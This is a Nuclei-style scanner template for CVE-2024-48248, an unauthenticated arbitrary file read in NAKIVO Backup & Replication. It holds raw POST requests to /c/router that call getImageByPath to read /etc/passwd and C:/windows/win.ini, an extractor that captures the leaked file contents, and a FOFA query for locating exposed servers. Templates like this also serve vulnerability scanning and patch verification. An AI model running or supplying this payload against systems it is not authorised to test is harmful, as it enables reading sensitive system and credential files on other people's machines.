id: nakivo-arbitrary-CVE-2024-48248-fileread
info:
  author: PokerSec
  metadata:
    fofa-search: app="NAKIVO-Backup-Replication"
  name: nakivo-arbitrary-CVE-2024-48248-fileread
  severity: high
requests:
- raw:
  - 'POST /c/router HTTP/1.1

    Host: {{Hostname}}

    Connection: keep-alive

    Content-type: application/json


    {"action": "STPreLoadManagement", "data": ["/etc/passwd"], "method": "getImageByPath",
    "sid": "", "tid": "watchTowr", "type": "watchTowr"}'
- extractors:
  - json:
    - .data.[]
    name: user
    part: body
    type: json
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"type":"rpc"'
    - STPreLoadManagement
    - '"data":['
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /c/router HTTP/1.1

    Host: {{Hostname}}

    Connection: keep-alive

    Content-type: application/json


    {"action": "STPreLoadManagement", "data": ["C:/windows/win.ini"], "method": "getImageByPath",
    "sid": "", "tid": "watchTowr", "type": "watchTowr"}'
  stop-at-first-match: true
